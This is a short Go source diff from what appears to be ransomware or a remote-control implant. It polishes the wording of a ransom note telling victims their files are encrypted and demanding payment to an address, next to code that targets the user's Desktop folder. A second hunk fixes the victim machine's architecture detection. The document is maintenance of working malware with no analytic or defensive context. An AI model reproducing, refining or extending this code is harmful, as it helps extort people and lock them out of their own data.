@@ -678,7 +678,7 @@ func doInstru(ic, iv string) string {
 			if err != nil {
 				out = "Error:" + err.Error()
 			} else {
-				text := fmt.Sprintf("All your files have been encrypted. Do not bother searching online. The only people on earth that can decrypt your files are us.\nTo start decryption process, send %s %s to this address:\n%s", ivspl[0], ivspl[1], ivspl[2])
+				text := fmt.Sprintf("All of your files have been encrypted. Do not bother searching online. The only people on earth that can decrypt your files are us.\nTo start the decryption process, send %s %s to this address:\n%s", ivspl[0], ivspl[1], ivspl[2])
 
 				start_paths := []string{
 					mainDrive + "\\" + "Users\\" + username + "\\Desktop",
@@ -1029,7 +1029,7 @@ func getMachineInfo() (string, int, string, string, int, string, string, string)
 	
 	if osArch == "AMD64" || osArch == "64-bit" {
 		arch = 0
-	} else if osArch == "x86" || osArch == "34-bit" {
+	} else if osArch == "x86" || osArch == "32-bit" {
 		arch = 1
 	} else {
 		arch = 2
